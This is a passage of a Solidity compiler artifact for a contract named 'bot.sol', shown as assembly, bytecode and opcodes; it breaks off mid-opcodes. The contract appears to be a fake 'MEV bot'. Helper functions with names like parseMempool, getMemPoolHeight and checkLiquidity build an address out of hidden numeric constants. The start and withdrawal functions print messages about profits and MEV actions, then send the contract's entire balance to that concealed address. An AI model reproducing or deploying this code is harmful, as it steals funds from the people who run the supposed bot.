gt\n      iszero\n        /* \"contracts/bot.sol\":9037:9061  (b2 >= 48) && (b2 <= 57) */\n    tag_93:\n        /* \"contracts/bot.sol\":9033:9104  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_94\n      jumpi\n        /* \"contracts/bot.sol\":9087:9089  48 */\n      0x30\n        /* \"contracts/bot.sol\":9081:9089  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":9033:9104  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_94:\n        /* \"contracts/bot.sol\":8956:9104  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_92:\n        /* \"contracts/bot.sol\":8878:9104  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_89:\n        /* \"contracts/bot.sol\":9137:9139  b2 */\n      dup2\n        /* \"contracts/bot.sol\":9132:9134  16 */\n      0x10\n        /* \"contracts/bot.sol\":9127:9129  b1 */\n      dup5\n        /* \"contracts/bot.sol\":9127:9134  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":9127:9139  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":9117:9140  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":8510:8511  2 */\n      0x02\n        /* \"contracts/bot.sol\":8505:8511  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8472:9151  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_74)\n    tag_75:\n      pop\n        /* \"contracts/bot.sol\":9175:9180  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":9160:9181  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":8276:9188  function parseMempool(string memory _a) internal pure returns (address _parsed) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":8018:8108  function getMemPoolOffset() internal pure returns (uint) {... */\n    tag_55:\n        /* \"contracts/bot.sol\":8069:8073  uint */\n      0x00\n        /* \"contracts/bot.sol\":8092:8101  203096485 */\n      0x0c1b01a5\n        /* \"contracts/bot.sol\":8085:8101  return 203096485 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8018:8108  function getMemPoolOffset() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9728:10150  function checkLiquidity(uint a) internal pure returns (string memory) {... */\n    tag_56:\n        /* \"contracts/bot.sol\":9783:9796  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9809:9819  uint count */\n      0x00\n        /* \"contracts/bot.sol\":9822:9823  0 */\n      dup1\n        /* \"contracts/bot.sol\":9809:9823  uint count = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9833:9839  uint b */\n      0x00\n        /* \"contracts/bot.sol\":9842:9843  a */\n      dup4\n        /* \"contracts/bot.sol\":9833:9843  uint b = a */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9853:9921  while (b != 0) {... */\n    tag_97:\n        /* \"contracts/bot.sol\":9865:9866  0 */\n      0x00\n        /* \"contracts/bot.sol\":9860:9861  b */\n      dup2\n        /* \"contracts/bot.sol\":9860:9866  b != 0 */\n      eq\n        /* \"contracts/bot.sol\":9853:9921  while (b != 0) {... */\n      tag_98\n      jumpi\n        /* \"contracts/bot.sol\":9882:9889  count++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":9908:9910  16 */\n      0x10\n        /* \"contracts/bot.sol\":9903:9910  b /= 16 */\n      dup2\n      dup2\n      tag_99\n      jumpi\n      invalid\n    tag_99:\n      div\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9853:9921  while (b != 0) {... */\n      jump(tag_97)\n    tag_98:\n        /* \"contracts/bot.sol\":9930:9946  bytes memory res */\n      0x60\n        /* \"contracts/bot.sol\":9959:9964  count */\n      dup3\n        /* \"contracts/bot.sol\":9949:9965  new bytes(count) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_100\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_100:\n        /* \"contracts/bot.sol\":9949:9965  new bytes(count) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_101\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":9949:9965  new bytes(count) */\n      swap1\n      pop\n    tag_101:\n      pop\n        /* \"contracts/bot.sol\":9930:9965  bytes memory res = new bytes(count) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9980:9986  uint i */\n      0x00\n        /* \"contracts/bot.sol\":9987:9988  0 */\n      dup1\n        /* \"contracts/bot.sol\":9980:9988  uint i=0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9975:10115  for (uint i=0; i<count; ++i) {... */\n    tag_102:\n        /* \"contracts/bot.sol\":9992:9997  count */\n      dup4\n        /* \"contracts/bot.sol\":9990:9991  i */\n      dup2\n        /* \"contracts/bot.sol\":9990:9997  i<count */\n      lt\n        /* \"contracts/bot.sol\":9975:10115  for (uint i=0; i<count; ++i) {... */\n      iszero\n      tag_103\n      jumpi\n        /* \"contracts/bot.sol\":10026:10028  16 */\n      0x10\n        /* \"contracts/bot.sol\":10022:10023  a */\n      dup7\n        /* \"contracts/bot.sol\":10022:10028  a % 16 */\n      dup2\n      tag_105\n      jumpi\n      invalid\n    tag_105:\n      mod\n        /* \"contracts/bot.sol\":10018:10028  b = a % 16 */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":10063:10083  toHexDigit(uint8(b)) */\n      tag_106\n        /* \"contracts/bot.sol\":10080:10081  b */\n      dup4\n        /* \"contracts/bot.sol\":10063:10073  toHexDigit */\n      tag_107\n        /* \"contracts/bot.sol\":10063:10083  toHexDigit(uint8(b)) */\n      jump\t// in\n    tag_106:\n        /* \"contracts/bot.sol\":10042:10045  res */\n      dup3\n        /* \"contracts/bot.sol\":10058:10059  1 */\n      0x01\n        /* \"contracts/bot.sol\":10054:10055  i */\n      dup4\n        /* \"contracts/bot.sol\":10046:10051  count */\n      dup8\n        /* \"contracts/bot.sol\":10046:10055  count - i */\n      sub\n        /* \"contracts/bot.sol\":10046:10059  count - i - 1 */\n      sub\n        /* \"contracts/bot.sol\":10042:10060  res[count - i - 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_108\n      jumpi\n      invalid\n    tag_108:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":10042:10083  res[count - i - 1] = toHexDigit(uint8(b)) */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":10102:10104  16 */\n      0x10\n        /* \"contracts/bot.sol\":10097:10104  a /= 16 */\n      dup7\n      dup2\n      tag_109\n      jumpi\n      invalid\n    tag_109:\n      div\n      swap6\n      pop\n        /* \"contracts/bot.sol\":9999:10002  ++i */\n      dup1\n      0x01\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9975:10115  for (uint i=0; i<count; ++i) {... */\n      jump(tag_102)\n    tag_103:\n      pop\n        /* \"contracts/bot.sol\":10139:10142  res */\n      dup1\n        /* \"contracts/bot.sol\":10125:10143  return string(res) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":9728:10150  function checkLiquidity(uint a) internal pure returns (string memory) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":16279:16890  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n    tag_57:\n        /* \"contracts/bot.sol\":16362:16375  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16387:16410  bytes memory _baseBytes */\n      dup1\n        /* \"contracts/bot.sol\":16419:16424  _base */\n      dup4\n        /* \"contracts/bot.sol\":16387:16425  bytes memory _baseBytes = bytes(_base) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16435:16459  bytes memory _valueBytes */\n      0x60\n        /* \"contracts/bot.sol\":16468:16474  _value */\n      dup4\n        /* \"contracts/bot.sol\":16435:16475  bytes memory _valueBytes = bytes(_value) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16486:16509  string memory _tmpValue */\n      0x60\n        /* \"contracts/bot.sol\":16543:16554  _valueBytes */\n      dup2\n        /* \"contracts/bot.sol\":16543:16561  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16523:16533  _baseBytes */\n      dup4\n        /* \"contracts/bot.sol\":16523:16540  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16523:16561  _baseBytes.length + _valueBytes.length */\n      add\n        /* \"contracts/bot.sol\":16512:16562  new string(_baseBytes.length + _valueBytes.length) */\n      0xffffffffffffffff\n      dup2\n      gt\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_111\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_111:\n        /* \"contracts/bot.sol\":16512:16562  new string(_baseBytes.length + _valueBytes.length) */\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x1f\n      add\n      not(0x1f)\n      and\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_112\n      jumpi\n      dup2\n      0x20\n      add\n        /* \"--CODEGEN--\":29:30   */\n      0x01\n        /* \"--CODEGEN--\":21:27   */\n      dup3\n        /* \"--CODEGEN--\":17:31   */\n      mul\n        /* \"--CODEGEN--\":124:128   */\n      dup1\n        /* \"--CODEGEN--\":108:122   */\n      calldatasize\n        /* \"--CODEGEN--\":100:106   */\n      dup4\n        /* \"--CODEGEN--\":87:129   */\n      calldatacopy\n        /* \"--CODEGEN--\":155:159   */\n      dup1\n        /* \"--CODEGEN--\":147:153   */\n      dup3\n        /* \"--CODEGEN--\":143:160   */\n      add\n        /* \"--CODEGEN--\":133:160   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:164   */\n      pop\n        /* \"contracts/bot.sol\":16512:16562  new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n    tag_112:\n      pop\n        /* \"contracts/bot.sol\":16486:16562  string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16572:16594  bytes memory _newValue */\n      0x60\n        /* \"contracts/bot.sol\":16603:16612  _tmpValue */\n      dup2\n        /* \"contracts/bot.sol\":16572:16613  bytes memory _newValue = bytes(_tmpValue) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16624:16630  uint i */\n      0x00\n        /* \"contracts/bot.sol\":16640:16646  uint j */\n      dup1\n        /* \"contracts/bot.sol\":16663:16664  0 */\n      0x00\n        /* \"contracts/bot.sol\":16661:16664  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":16657:16747  for(i=0; i<_baseBytes.length; i++) {... */\n    tag_113:\n        /* \"contracts/bot.sol\":16668:16678  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":16668:16685  _baseBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16666:16667  i */\n      dup3\n        /* \"contracts/bot.sol\":16666:16685  i<_baseBytes.length */\n      lt\n        /* \"contracts/bot.sol\":16657:16747  for(i=0; i<_baseBytes.length; i++) {... */\n      iszero\n      tag_114\n      jumpi\n        /* \"contracts/bot.sol\":16723:16733  _baseBytes */\n      dup6\n        /* \"contracts/bot.sol\":16734:16735  i */\n      dup3\n        /* \"contracts/bot.sol\":16723:16736  _baseBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_116\n      jumpi\n      invalid\n    tag_116:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":16706:16715  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":16716:16719  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":16706:16720  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_117\n      jumpi\n      invalid\n    tag_117:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":16706:16736  _newValue[j++] = _baseBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":16687:16690  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":16657:16747  for(i=0; i<_baseBytes.length; i++) {... */\n      jump(tag_113)\n    tag_114:\n        /* \"contracts/bot.sol\":16763:16764  0 */\n      0x00\n        /* \"contracts/bot.sol\":16761:16764  i=0 */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":16757:16849  for(i=0; i<_valueBytes.length; i++) {... */\n    tag_118:\n        /* \"contracts/bot.sol\":16768:16779  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":16768:16786  _valueBytes.length */\n      mload\n        /* \"contracts/bot.sol\":16766:16767  i */\n      dup3\n        /* \"contracts/bot.sol\":16766:16786  i<_valueBytes.length */\n      lt\n        /* \"contracts/bot.sol\":16757:16849  for(i=0; i<_valueBytes.length; i++) {... */\n      iszero\n      tag_119\n      jumpi\n        /* \"contracts/bot.sol\":16824:16835  _valueBytes */\n      dup5\n        /* \"contracts/bot.sol\":16836:16837  i */\n      dup3\n        /* \"contracts/bot.sol\":16824:16838  _valueBytes[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_121\n      jumpi\n      invalid\n    tag_121:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":16807:16816  _newValue */\n      dup4\n        /* \"contracts/bot.sol\":16817:16820  j++ */\n      dup3\n      dup1\n      0x01\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":16807:16821  _newValue[j++] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_122\n      jumpi\n      invalid\n    tag_122:\n      0x20\n      add\n      add\n        /* \"contracts/bot.sol\":16807:16838  _newValue[j++] = _valueBytes[i] */\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      dup2\n      0x00\n      byte\n      swap1\n      mstore8\n      pop\n        /* \"contracts/bot.sol\":16788:16791  i++ */\n      dup2\n      dup1\n      0x01\n      add\n      swap3\n      pop\n      pop\n        /* \"contracts/bot.sol\":16757:16849  for(i=0; i<_valueBytes.length; i++) {... */\n      jump(tag_118)\n    tag_119:\n        /* \"contracts/bot.sol\":16873:16882  _newValue */\n      dup3\n        /* \"contracts/bot.sol\":16859:16883  return string(_newValue) */\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":16279:16890  function mempool(string memory _base, string memory _value) internal pure returns (string memory) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":12716:12804  function getMemPoolHeight() internal pure returns (uint) {... */\n    tag_59:\n        /* \"contracts/bot.sol\":12767:12771  uint */\n      0x00\n        /* \"contracts/bot.sol\":12790:12797  9441410 */\n      0x901082\n        /* \"contracts/bot.sol\":12783:12797  return 9441410 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":12716:12804  function getMemPoolHeight() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15901:15987  function getMemPoolDepth() internal pure returns (uint) {... */\n    tag_61:\n        /* \"contracts/bot.sol\":15951:15955  uint */\n      0x00\n        /* \"contracts/bot.sol\":15974:15980  511825 */\n      0x07cf51\n        /* \"contracts/bot.sol\":15967:15980  return 511825 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15901:15987  function getMemPoolDepth() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":14183:14502  function toHexDigit(uint8 d) pure internal returns (byte) {... */\n    tag_107:\n        /* \"contracts/bot.sol\":14235:14239  byte */\n      0x00\n        /* \"contracts/bot.sol\":14260:14261  d */\n      dup2\n        /* \"contracts/bot.sol\":14255:14261  0 <= d */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14255:14256  0 */\n      0x00\n        /* \"contracts/bot.sol\":14255:14261  0 <= d */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14255:14271  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_126\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14270:14271  9 */\n      0x09\n        /* \"contracts/bot.sol\":14265:14266  d */\n      dup3\n        /* \"contracts/bot.sol\":14265:14271  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14255:14271  0 <= d && d <= 9 */\n    tag_126:\n        /* \"contracts/bot.sol\":14251:14438  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_127\n      jumpi\n        /* \"contracts/bot.sol\":14318:14319  d */\n      dup2\n        /* \"contracts/bot.sol\":14305:14314  byte('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14299:14315  uint8(byte('0')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14299:14319  uint8(byte('0')) + d */\n      add\n        /* \"contracts/bot.sol\":14294:14320  byte(uint8(byte('0')) + d) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14287:14320  return byte(uint8(byte('0')) + d) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"contracts/bot.sol\":14251:14438  if (0 <= d && d <= 9) {... */\n    tag_127:\n        /* \"contracts/bot.sol\":14353:14354  d */\n      dup2\n        /* \"contracts/bot.sol\":14341:14355  10 <= uint8(d) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":14341:14343  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14341:14355  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14341:14373  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_129\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":14371:14373  15 */\n      0x0f\n        /* \"contracts/bot.sol\":14365:14366  d */\n      dup3\n        /* \"contracts/bot.sol\":14359:14373  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":14341:14373  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_129:\n        /* \"contracts/bot.sol\":14337:14438  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_130\n      jumpi\n        /* \"contracts/bot.sol\":14424:14426  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14420:14421  d */\n      dup3\n        /* \"contracts/bot.sol\":14407:14416  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14401:14417  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14401:14421  uint8(byte('a')) + d */\n      add\n        /* \"contracts/bot.sol\":14401:14426  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"contracts/bot.sol\":14396:14427  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14389:14427  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_125)\n        /* \"contracts/bot.sol\":14337:14438  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_130:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":14183:14502  function toHexDigit(uint8 d) pure internal returns (byte) {... */\n    tag_125:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107 52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e\n\n    auxdata: 0xa26469706673582212204007bec56630b677258ac908ed53977053e3baaba4c545d175dc595c968cf28764736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040523480156200001157600080fd5b5060405162000e4038038062000e40833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160019080519060200190620001cd929190620001ef565b508060009080519060200190620001e6929190620001ef565b5050506200029e565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b6200029b91905b80821115620002975760008160009055506001016200027d565b5090565b90565b610b9280620002ae6000396000f3fe6080604052600436106100435760003560e01c80636c02a9311461004f5780637b61c320146100df578063be9a65551461016f578063d4e93292146101795761004a565b3661004a57005b600080fd5b34801561005b57600080fd5b50610064610183565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100a4578082015181840152602081019050610089565b50505050905090810190601f1680156100d15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100eb57600080fd5b506100f4610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610134578082015181840152602081019050610119565b50505050905090810190601f1680156101615780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101776102bf565b005b61018161035a565b005b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102195780601f106101ee57610100808354040283529160200191610219565b820191906000526020600020905b8154815290600101906020018083116101fc57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156102b75780601f1061028c576101008083540402835291602001916102b7565b820191906000526020600020905b81548152906001019060200180831161029a57829003601f168201915b505050505081565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b256038913960400191505060405180910390a16103126103f5565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610357573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610af26033913960400191505060405180910390a16103ad61040c565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103f2573d6000803e3d6000fd5b50565b6000610407610402610423565b61056c565b905090565b600061041e610419610423565b61056c565b905090565b6060806104746040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061046f61046a6107c5565b6107d1565b6108d7565b90506000638595ce91905060006206804890506000640ec044cf089050600061049b610a32565b905060006104a7610a3d565b905060606104bd876104b8886107d1565b6108d7565b905060606104db6104cd876107d1565b6104d6876107d1565b6108d7565b905060606104e8856107d1565b905060606104f5856107d1565b9050606061051561050686866108d7565b61051085856108d7565b6108d7565b905060606105586040518060400160405280600181526020017f3000000000000000000000000000000000000000000000000000000000000000815250836108d7565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a8110156107b8576101008402935084818151811061059e57fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106105c057fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610611575060668373ffffffffffffffffffffffffffffffffffffffff1611155b15610621576057830392506106bb565b60418373ffffffffffffffffffffffffffffffffffffffff161015801561065f575060468373ffffffffffffffffffffffffffffffffffffffff1611155b1561066f576037830392506106ba565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106ad575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156106b9576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156106f9575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610709576057820391506107a3565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610747575060468273ffffffffffffffffffffffffffffffffffffffff1611155b15610757576037820391506107a2565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610795575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107a1576030820391505b5b5b81601084020184019350600281019050610582565b5082945050505050919050565b6000630c1b01a5905090565b6060600080905060008390505b60008114610800578180600101925050601081816107f857fe5b0490506107de565b60608267ffffffffffffffff8111801561081957600080fd5b506040519080825280601f01601f19166020018201604052801561084c5781602001600182028036833780820191505090505b50905060008090505b838110156108cb576010868161086757fe5b06925061087383610a48565b826001838703038151811061088457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350601086816108bd57fe5b049550806001019050610855565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff811180156108ff57600080fd5b506040519080825280601f01601f1916602001820160405280156109325781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156109b05785828151811061095757fe5b602001015160f81c60f81b83828060010193508151811061097457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610942565b600091505b8451821015610a23578482815181106109ca57fe5b602001015160f81c60f81b8382806001019350815181106109e757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109b5565b82965050505050505092915050565b600062901082905090565b60006207cf51905090565b60008160ff16600011158015610a62575060098260ff1611155b15610a9757817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610aec565b8160ff16600a11158015610aaf5750600f8260ff1611155b15610ae757600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610aec565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea26469706673582212204007bec56630b677258ac908ed53977053e3baaba4c545d175dc595c968cf28764736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xE40 CODESIZE SUB DUP1 PUSH3 0xE40 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 